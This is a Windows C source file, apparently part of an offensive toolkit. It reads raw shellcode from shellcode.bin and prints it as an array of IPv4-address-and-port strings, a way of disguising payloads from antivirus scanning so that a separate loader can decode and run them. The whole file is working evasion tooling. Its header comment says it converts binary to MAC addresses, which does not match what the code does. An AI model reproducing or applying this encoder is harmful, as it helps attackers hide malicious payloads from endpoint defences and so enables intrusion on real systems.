/*
    Generator
    Convert binary to MAC

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcgenerate.cpp 
*/

#include <windows.h>
#include <ip2string.h>
#include <stdint.h>
#include <stdio.h>

#pragma comment(lib,"ntdll")


int main()
{
    HANDLE  f;
    SIZE_T  payload_len, compressed_len;
    DWORD   nread;

    uint8_t * payload;
    uint8_t * compressed;

    int idx, nitem = 0;
    SIZE_T  remainder, 
            multiple = 6;   // IPv4 = 4, port = 2

    in_addr *   ip4;
    USHORT  *   port;
    ULONG       ip4len;
    char        buffer[32];

    // open existing file
    f = CreateFile ("shellcode.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // query the size and create enough space in heap
    payload_len = GetFileSize (f, NULL);
    remainder   = payload_len % multiple;
    if (remainder)
    {
        payload_len += (multiple - remainder);
    }
    payload = (uint8_t*) HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, payload_len);

    // read the shellcode
    ReadFile(f, payload, payload_len, &nread, NULL);

    // print
    printf ("{ \n");
    for (idx = 0; idx < payload_len; idx += multiple, nitem++)
    {
        ip4  = (in_addr*) &payload[idx];
        port = (USHORT*) &payload[idx + 4];
        ip4len = sizeof(buffer);

        nread = RtlIpv4AddressToStringEx (ip4, *port, buffer, &ip4len);

        printf("  \"%s\",\n", buffer);
    }
    printf ("}\n");
    printf ("Item: %d\n", nitem);

    // destroy heap
    HeapFree (GetProcessHeap(), 0, payload);

    return 0;
}